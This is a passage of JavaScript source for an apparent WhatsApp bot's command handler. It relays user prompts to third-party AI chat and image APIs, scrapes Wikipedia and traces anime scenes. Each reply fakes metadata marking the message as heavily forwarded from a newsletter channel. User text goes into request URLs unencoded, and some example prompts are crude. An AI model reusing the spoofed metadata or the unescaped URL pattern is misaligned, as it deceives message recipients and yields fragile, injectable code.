          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg') }, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'blackboxai': {
	if (!text) return newReply(`Example : ${prefix + command} write a program to delete file`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/blackbox-ai?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Blackbox AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg') }, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'travel-assistant': {
	if (!text) return newReply(`Example : ${prefix + command} how can i visit taj mahal`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/copilot2trip?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Travel Assistant AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg') }, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'dalle': {
	if (!text) return newReply(`Example : ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/dalle?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Dalle\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'guru-ai': {
	if (!text) return newReply(`Example : ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/degreeGuru?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Guru AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'emi-ai': {
	if (!text) return newReply(`Example : ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/emi?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Emi AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'claude-ai': {
	if (!text) return newReply(`Example : ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/claude?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Claude AI\n\n${gpt.result.response}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'costume-ai': {
	if (!text) return newReply(`Example : ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/gpt-logic?q=${text}&logic=${text}&realtime=true`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Costume AI\n\n${gpt.data.response}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'herc-ai': {
	if (!text) return newReply(`Example : ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-chat?model=v3&q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI\n\n${gpt.result.response}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'hercaiv1': {
	if (!text) return newReply(`Example : ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=v1&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI V1\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'hercai-cartoon': {
	if (!text) return newReply(`Example : ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=v3&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Cartoon\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'hercai-animefy': {
	if (!text) return newReply(`Example : ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=animefy&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Animefy\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'hercai-lexica': {
	if (!text) return newReply(`Example : ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=lexica&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Lexica\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'hercai-prodia': {
	if (!text) return newReply(`Example : ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=prodia&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Prodia\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'hercai-simurg': {
	if (!text) return newReply(`Example : ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=simurg&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Simurg\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'hercai-raava': {
	if (!text) return newReply(`Example : ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=raava&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Raava\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'hercai-shonin': {
	if (!text) return newReply(`Example : ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=shonin&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Shonin\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'realistic': case '3dmodel': {
    	if (!text) return newReply(`*Example:* ${prefix + command} blue sky`)
  let currentTime = Date.now();
  if (currentTime - lastUsed < 10000) return newReply("Cooldown 10 seconds, try again later")
  lastUsed = currentTime;
  try {
    let negative = 'ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers, adult, naked, 18+';
    let gpt = await (await fetch(`https://itzpire.com/ai/${command}?prompt=${text}`)).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> ${command} AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return newReply("`GPT Not Responding`")
  }
}
break
case 'wikipedia': case 'wiki': {
	if (!text) return newReply(`Enter what you want to search for on Wikipedia`)
	
    try {
	const link =  await axios.get(`https://en.wikipedia.org/wiki/${text}`)
	const $ = cheerio.load(link.data)
	let wik = $('#firstHeading').text().trim()
	let resulw = $('#mw-content-text > div.mw-parser-output').find('p').text().trim()
	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `▢ *Wikipedia*

‣ Title : ${wik}

${resulw}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
} catch (e) {
  newReply('⚠️ No results found ')
}
}
break
case 'traceanime': {
	try {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || q.mediaType || "";
    if (!mime.startsWith('image')) {
      return newReply("*Respond to an image*");
    }
    let data = await q.download();
    let image = await uploadImage(data);
    let apiUrl = `https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(image)}`;
    console.log("API URL:", apiUrl);
    let response = await fetch(apiUrl);
    let result = await response.json();
    console.log("API Response:", result);
    if (!result || result.error || result.result.length === 0) {
      return newReply("*Error: Could not track the anime.*");
    }
    let { anilist, from, to, similarity, video, episode } = result.result[0];
    let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Unknown Title";
    let message = `*Anime:* ${animeTitle}\n`;
    if (anilist.synonyms && anilist.synonyms.length > 0) {
      message += `*Synonyms:* ${anilist.synonyms.join(", ")}\n`;
    }
    message += `*Similarity:* ${similarity.toFixed(2)}%\n`;
    message += `*Time:* ${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}\n`;
    if (episode) {
      message += `*Episode:* ${episode}\n`;
    }
    console.log("Anime Information:", {
      animeTitle,
      synonyms: anilist.synonyms ? anilist.synonyms.join(", ") : "Not Available",
      similarity,
      timestamp: `${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}`,
      video,
      episode,
    });
    // Send the video with anime information as the caption
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video: {url: video}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error("Error:", error);
    newReply("*Error: Could not track the anime or send the video.*");
  }
};
break
case 'stickersearch': {
if (!text) return newReply(`Example : ${m.prefix + command} kururmi`)
var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
var jeson = await js.json()
let msgs = generateWAMessageFromContent(m.chat, {
